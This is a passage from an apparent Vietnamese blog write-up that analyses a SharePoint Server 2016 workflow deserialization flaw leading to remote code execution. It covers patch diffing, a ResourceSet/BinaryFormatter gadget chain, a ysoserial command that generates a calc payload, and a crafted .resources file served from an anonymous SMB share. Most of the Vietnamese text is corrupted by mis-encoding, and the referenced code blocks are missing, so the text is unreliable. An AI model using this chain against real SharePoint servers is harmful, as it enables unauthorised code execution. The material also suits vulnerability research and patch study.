vi·ªác t·∫°o v√† s·ª≠ d·ª•ng workflow.Diff codeC√†i ƒë·∫∑t b·∫£n l·ªói c·ªßa Sharepoint Enterprise Server 2016, l·ªói t·ªìn t·∫°i ·ªü phi√™n b·∫£n sharepoint n√†y cho ƒë·∫øn b·∫£n patch KB5001946 v√† ƒë∆∞·ª£c v√° ·ªü b·∫£n KB5001976. Ti·∫øn h√†nh c√†i ƒë·∫∑t hai b·∫£n v√† s·ª≠ d·ª•ng 7zip ƒë·ªÉ gom c√°c file dll c·∫ßn thi·∫øt cho vi·ªác diff.7z.exe a dll.7z -r .\\Microsoft.Sharepoint.*.dllTi·∫øn h√†nh gom ·ªü 3 th∆∞ m·ª•c C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL C:\\Program Files\\Common Files\\microsoft shared C:\\inetpub\\wwwroot\\wssK·∫øt qu·∫£ diff s·ª≠ d·ª•ng WinMerge. Quan s√°t th·∫•y c√≥ s·ª± kh√°c bi·ªát khi c√≥ m·ªôt h√†m m·ªõi trong b·∫£n v√° li√™n quan ƒë·∫øn SetVariableActivity t·ªìn t·∫°i ·ªü l·ªõp Microsoft.SharePoint.Workflow.SPNoCodeXomlCompilerNh√¨n t√™n h√†m hi·ªÉu ngay v·∫•n ƒë·ªÅ, h√†m n√†y d√πng ƒë·ªÉ v√° l·ªói c·ª• th·ªÉ l√† validate thu·ªôc t√≠nh ValueType c·ªßa l·ªõp SetVariableActivity. H√†m n√†y ƒë∆∞·ª£c g·ªçi b√™n trong h√†m IsGoodWorkflowH√†m IsGoodWorkflow l·∫°i ƒë∆∞·ª£c g·ªçi trong h√†m CompileBytesTi·∫øn h√†nh ph√¢n t√≠ch h√†m CompileBytes ƒë·ªÉ xem n√≥ ƒë∆∞·ª£c g·ªçi t·ª´ ƒë√¢uS·ª≠ d·ª•ng dnspy, t√¨m ra ƒë∆∞·ª£c h√†m ValidateWorkflowMarkupAndCreateSupportObjects. Theo t√†i li·ªáu c·ªßa Microsoft, khi c√°c file workflow ƒë∆∞·ª£c t·∫£i l√™n, n·ªôi dung b√™n trong s·∫Ω ƒëi qua h√†m n√†y ƒë·ªÉ validate v√† bi√™n d·ªãch. Nh∆∞ v·∫≠y ƒë·ªÉ c√≥ ƒë∆∞·ª£c m·ªôt ki·ªÉu .NET t√πy √Ω ·ªü ƒë√¢y ch√≠nh l√† t·∫°o m·ªôt workflow, b√™n trong c√≥ action SetVariableActivity v·ªõi gi√° tr·ªã thu·ªôc t√≠nh ValueType ƒë∆∞·ª£c t√πy ch·ªânh b·ªüi User.T·∫°o th√†nh c√¥ng m·ªôt Crafted SetVariableActivityS·ª≠ d·ª•ng giao di·ªán tr√™n Workflow Designer, t·∫°o m·ªôt workflow, th√™m m·ªôt action l√† Set Workflow Variable v√†o, nh∆∞ v·∫≠y c√≥ th·ªÉ t·∫°o ƒë∆∞·ª£c m·ªôt SetVariableActivity. Sau khi t·∫°o xong workflow s·∫Ω c√≥ hai file ƒë∆∞·ª£c h√¨nh th√†nh (Khi publish th√¨ s·∫Ω c√≥ th√™m m·ªôt file .xsn ho·∫∑c .aspx). V√≠ d·ª• ·ªü ƒë√¢y workflow c√≥ t√™n l√† testFile test.xoml l√† file markup c·ªßa workflow d√πng ƒë·ªÉ bi·ªÉu di·ªÖn c√°c step v√† action. C√≤n file test.xoml.wfconfig.xml l√† file c·∫•u h√¨nh c·ªßa workflow. ·ªû ƒë√¢y m√¨nh d√†nh s·ª± quan t√¢m cho file test.xomlNgo√†i ValueType th√¨ SetVariableActivity c√≥ hai thu·ªôc t√≠nh kh√°c l√† Value v√† Variable. Variable s·∫Ω tr·ªè ƒë·∫øn bi·∫øn c·∫ßn ƒë∆∞·ª£c set gi√° tr·ªã, bi·∫øn n√†y ƒë∆∞·ª£c khai b√°o ·ªü ph·∫ßn RootWorkflowActivityWithData.WorkflowFields. Value l√† gi√° tr·ªã ƒë·ªÉ set cho bi·∫øn n√†y.C√≥ th·ªÉ th·∫•y ngay ph·∫ßn SetVariableActivity ƒë√£ ƒë∆∞·ª£c t·∫°o, tuy nhi√™n thu·ªôc t√≠nh ValueType v·∫´n kh√¥ng th·ªÉ control ƒë∆∞·ª£c ho√†n to√†n b·∫±ng vi·ªác s·ª≠ d·ª•ng giao di·ªán. ƒê·ªÉ ho√†n to√†n t√πy ch·ªânh ValueType, c·∫ßn t·∫°o hai file markup v√† config h·ª£p l·ªá ·ªü b√™n ngo√†i (hai file markup v√† config c√≥ th·ªÉ copy t·ª´ vi·ªác t·∫°o 1 flow gi·∫£ sau ƒë√≥ edit l·∫°i) v√† upload th·∫≥ng l√™n th∆∞ m·ª•c workflow c·ªßa Sharepoint Designer, sau ƒë√≥ s·ª≠ d·ª•ng c√¥ng c·ª• n√†y publish workflow l√™n sharepoint site ƒë·ªÉ c√≥ th·ªÉ s·ª≠ d·ª•ng. Theo c√°ch n√†y ƒë√£ c√≥ th·ªÉ t·∫°o m·ªôt Crafted SetVariableActivity. L∆∞u √Ω r·∫±ng kh√¥ng ph·∫£i thay ƒë·ªïi ki·ªÉu g√¨ c≈©ng c√≥ th·ªÉ publish ƒë∆∞·ª£c m√† Sharepoint Designer s·∫Ω validate n√≥ h·ª£p l·ªá xong m·ªõi cho ph√©p Publish. Th·ª±c nghi·ªám th·∫•y r·∫±ng thay ƒë·ªïi gi√° tr·ªã thu·ªôc t√≠nh ValueType v·∫´n c√≥ th·ªÉ publish ƒë∆∞·ª£c.T·∫°o ki·ªÉu .NET n√†o cho RCE ?Quan s√°t l·ªõp Microsoft.SharePoint.WorkflowActions.SetVariableActivityTheo t√†i li·ªáu c·ªßa Microsoft, h√†m Execute s·∫Ω ƒë∆∞·ª£c g·ªçi khi ch·∫°y activity. Bi·∫øn type ƒë∆∞·ª£c t·∫°o th√†nh t·ª´ thu·ªôc t√≠nh ValueType. Hai v·ªã tr√≠ khoanh ƒë·ªè s·∫Ω l√† ƒëo·∫°n code ti·ªÅm nƒÉng ƒë·ªÉ t·∫°o object. ·ªû khoanh ƒë·ªè ƒë·∫ßu ti√™n, s·ª≠ d·ª•ng converter ƒë∆∞·ª£c l·∫•y t·ª´ type c·ªßa obj. Gi√° tr·ªã c·ªßa bi·∫øn obj ƒë∆∞·ª£c l·∫•y t·ª´ thu·ªôc t√≠nh Value v√† ƒë∆∞·ª£c convert th√†nh type c·ªßa bi·∫øn c·∫ßn thay ƒë·ªïi gi√° tr·ªã.Do type c·ªßa bi·∫øn n√†y kh√¥ng th·ªÉ t√πy ch·ªânh ƒë∆∞·ª£c, v√¨ v·∫≠y type c·ªßa obj b·ªã gi·ªõi h·∫°n ·ªü c√°c type c∆° b·∫£n nh∆∞ String, Int32, ‚Ä¶ v√† converter c·ªßa c√°c type n√†y s·∫Ω kh√¥ng th·ªÉ convert obj th√†nh ki·ªÉu ValueType t√πy √Ω ƒë∆∞·ª£c. Do ƒë√≥ suy nghƒ© v·ªÅ khoanh ƒë·ªè th·ª© 2. ·ªû ƒë√¢y s·∫Ω t·∫°o ra m·ªôt constructor c·ªßa ValueType nh·∫≠n m·ªôt tham s·ªë ƒë·∫ßu v√†o d∆∞·ªõi d·∫°ng String. Qua m·ªôt s·ªë t√¨m hi·ªÉu v√† c√°c b√†i PoC ƒë∆∞·ª£c public, t√¨m ra ƒë∆∞·ª£c m·ªôt class ph√π h·ª£p ch√≠nh l√† System.Resources.ResourceSet c√≥ constructor c·∫ßn thi·∫øt.// ResourceSet ConstructorConstructor n√†y nh·∫≠n ƒë·∫ßu v√†o l√† ƒë∆∞·ªùng d·∫´n ƒë·∫øn file .resource, t·∫°o m·ªôt ResourceHeader v√† g·ªçi h√†m ReadResource. Quan s√°t constructor c·ªßa ResourceHeader// ResourceHeader ConstructorConstructor n√†y ƒë·ªçc file t·ª´ ƒë∆∞·ªùng d·∫´n fileName l∆∞u v√†o thu·ªôc t√≠nh _store, g·ªçi h√†m ReadResource()// ResourceHeader.ReadResource()H√†m n√†y t·∫°o m·ªôt BinaryFormatter v√† l∆∞u v√†o thu·ªôc t√≠nh _objFormatter. B√¢y gi·ªù quay l·∫°i h√†m ReadResource c·ªßa ResourceSet// ResourceSet.ReadResource()H√†m n√†y t·∫°o bi·∫øn enum t·ª´ l·ªõp ResourceEnumerator b√™n trong l·ªõp ResourceReader Sau ƒë√≥ s·ª≠ d·ª•ng bi·∫øn n√†y ƒë·ªÉ duy·ªát v√† g·ªçi thu·ªôc t√≠nh Value ƒë·ªÉ l·∫•y gi√° tr·ªã. Ki·ªÉm tra ph∆∞∆°ng th·ª©c get c·ªßa thu·ªôc t√≠nh Value b√™n trong ResourceEnumerator// ResourceHeader.ResourceEnumerator.Value// ResourceHeader.GetValueForNameIndex()// ResourceHeader.LoadObjectV2()// ResourceHeader.DeserializeObject()·ªû ƒë√¢y ResourceHeader s·ª≠ d·ª•ng thu·ªôc t√≠nh _objFormatter ƒë·ªÉ deserialize thu·ªôc t√≠nh _store. Trong ƒë√≥ _objFormatter l√† m·ªôt BinaryFormatter, _store l√† n·ªôi dung b√™n trong file .resources =&amp;gt; L·ªói deserialize .NETT·∫°o file .resources ch·ª©a payloadVisual studio s·ª≠ d·ª•ng Resource File Generator (Resgen.exe) ƒë·ªÉ convert file .resx th√†nh m·ªôt binary resource (.resources).T·∫°o file .resx s·ª≠ d·ª•ng ch·ª©c nƒÉng add file c·ªßa Visual Studio. ƒê·ªÉ th√™m payload v√†o, ch√∫ng ta th√™m node data v√†o trong root trong file .resx nh∆∞ sauPh·∫ßn payload ƒë∆∞·ª£c t·∫°o b·∫±ng c√°ch s·ª≠ d·ª•ng c√¥ng c·ª• ysoserial.\\ysoserial.exe -o base64 -c &quot;calc&quot; -f BinaryFormatter -g TypeConfuseDelegateCu·ªëi c√πng l√† d√πng resgen ƒë·ªÉ generate ra file .resourcesSau khi ƒë√£ ƒë·ªß l√¥ng ƒë·ªß c√°nh, th·ª±c hi·ªán m√¥ ph·ªèng CVE n√†y.Proof of ConceptT·∫°o m·ªôt site tr√™n sharepoint theo tutorial. Sau ƒë√≥ t·∫°o m·ªôt t√†i kho·∫£n attacker. Attacker c·∫ßn c√≥ quy·ªÅn t·∫°o workflow tr√™n site, ƒëi·ªÅu khi·ªÉn m·ªôt m√°y t√≠nh c√≥ li√™n k·∫øt v·ªõi server sharepoint.T·∫°o m·ªôt file .resources v·ªõi payload th·ª±c hi·ªán command ƒë∆°n gi·∫£n l√† b·∫≠t calculator (Resource1.resources)T·∫°o m·ªôt SMB server ƒë∆°n gi·∫£n theo h∆∞·ªõng d·∫´n n√†y ƒë·ªÉ t·∫°o m·ªôt folder shared cho ph√©p quy·ªÅn anonymous ƒë·ªçc c√°c file b√™n trong, y√™u c·∫ßu m√°y attacker c√≥ k·∫øt n·ªëi v·ªõi server sharepoint. M·ª•c ƒë√≠ch l√† ƒë·ªÉ t·∫°o ƒë∆∞·ªùng d·∫´n ƒë·∫øn file .resources s·ª≠ d·ª•ng cho l·ªõp ResourceSet. Sau ƒë√≥ ƒë∆∞a file .resources ƒë√£ t·∫°o v√†o ƒë√¢y, nh∆∞ v·∫≠y ƒë∆∞·ªùng d·∫´n ƒë∆∞·ª£c t·∫°o c√≥ d·∫°ng//DESKTOP-9GA3D02/shared/Resource1.resourcesB∆∞·ªõc ti·∫øp theo l√† t·∫°o hai file markup v√† config cho workflow, ph·∫ßn SetVariableActivity c√≥ d·∫°ng sau (ph·∫ßn value ƒë·ªÉ gi√° tr·ªã l√† ƒë∆∞·ªùng d·∫´n ƒë·∫øn .resources)Upload hai file l√™n th∆∞ m·ª•c workflow c·ªßa Sharepoint Designer v√† publish workflow n√†y.K·∫øt qu·∫£ sau khi workflow n√†y ƒë∆∞·ª£c ch·∫°y l√† m·ªôt process Calculator ƒë∆∞·ª£c t·∫°o raK·∫øt lu·∫≠nT·ªìn t·∫°i m·ªôt s·ªë l·ªõp c√≥ gadget chain ·∫©n ch·ª©a b√™n trong c√°c constructor. V√† c√°c constructor ƒë∆∞·ª£c sinh ra ƒë·ªÅu c√≥ l√≠ do, n·∫øu c√≥ th·ªÉ t√¨m ra c√°c l·ªõp nh∆∞ v·∫≠y th√¨ c√≥ th·ªÉ nghi√™n c·ª©u vi·ªác ki·ªÉm so√°t c√°c param c·ªßa constructor v√† t√¨m ki·∫øm c∆° h·ªôi RCE xung quanh c√°c l·ªõp n√†y.REFERENCEShttps://www.zerodayinitiative.com/advisories/ZDI-21-828/https://support.microsoft.com/en-us/office/introduction-to-sharepoint-workflow-07982276-54e8-4e17-8699-5056eff4d9e3https://www.youtube.com/watch?v=JQYrqwgpAFYhttps://blog.virtosoftware.com/how-to-create-sharepoint-designer-2013-workflow/https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconvertershttp://nikolar.com/2015/03/10/creating-network-share-with-anonymous-access/" } ]
